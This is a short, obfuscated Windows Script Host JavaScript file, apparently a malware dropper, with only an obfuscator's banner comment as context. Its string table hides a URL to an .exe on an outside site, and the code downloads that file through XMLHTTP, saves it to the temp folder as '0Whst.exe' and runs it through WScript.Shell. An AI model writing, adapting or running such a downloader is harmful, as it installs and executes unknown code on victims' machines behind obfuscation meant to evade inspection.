/***************************************************************************/
/*                                                                         */
/*  This obfuscated code was created by Javascript Obfuscator Free Version.*/
/*  Javascript Obfuscator Free Version can be downloaded here              */
/*  http://javascriptobfuscator.com                                        */
/*                                                                         */
/***************************************************************************/
var _$_850e=["http://fan-de-sport.com/sosdoudou/sosdoudou_V3/best/dm.exe","WScript.Shell","CreateObject","Scripting.FileSystemObject","GetSpecialFolder","\\0Whst.exe","MSXML2.XMLHTTP","GET","open","send","Status","FileExists","DeleteFile","ADODB.Stream","Open","Type","ResponseBody","Write","Position","SaveToFile","Close","Run"];var url=_$_850e[0];var WshShell=WScript[_$_850e[2]](_$_850e[1]);var fso;fso=  new ActiveXObject(_$_850e[3]);var TemporaryFolder=2;var temp=fso[_$_850e[4]](TemporaryFolder);var filepath=temp+ _$_850e[5];var xhr= new ActiveXObject(_$_850e[6]);xhr[_$_850e[8]](_$_850e[7],url,false);xhr[_$_850e[9]]();if(xhr[_$_850e[10]]== 200){var fso= new ActiveXObject(_$_850e[3]);if(fso[_$_850e[11]](filepath)){fso[_$_850e[12]](filepath)};var stream= new ActiveXObject(_$_850e[13]);stream[_$_850e[14]]();stream[_$_850e[15]]= 1;stream[_$_850e[17]](xhr[_$_850e[16]]);stream[_$_850e[18]]= 0;stream[_$_850e[19]](filepath);stream[_$_850e[20]]();WshShell=  new ActiveXObject(_$_850e[1]);WshShell[_$_850e[21]](filepath,1,false)}
